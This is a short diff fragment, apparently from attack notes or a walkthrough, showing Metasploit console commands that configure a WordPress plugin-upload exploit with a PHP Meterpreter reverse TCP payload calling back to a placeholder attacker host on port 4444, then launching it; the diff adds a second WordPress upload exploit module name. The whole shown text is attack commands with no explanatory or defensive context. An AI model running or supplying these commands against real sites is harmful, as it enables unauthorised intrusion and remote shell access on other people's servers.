@@ -18,3 +18,5 @@ msf6 exploit(multi/http/wordpress_plugin_upload) > set LHOST <your_attacking_mac
 msf6 exploit(multi/http/wordpress_plugin_upload) > set LPORT 4444
 msf6 exploit(multi/http/wordpress_plugin_upload) > set PAYLOAD php/meterpreter_reverse_tcp
 msf6 exploit(multi/http/wordpress_plugin_upload) > exploit
+
+exploit/unix/webapp/wp_slideshowgallery_upload
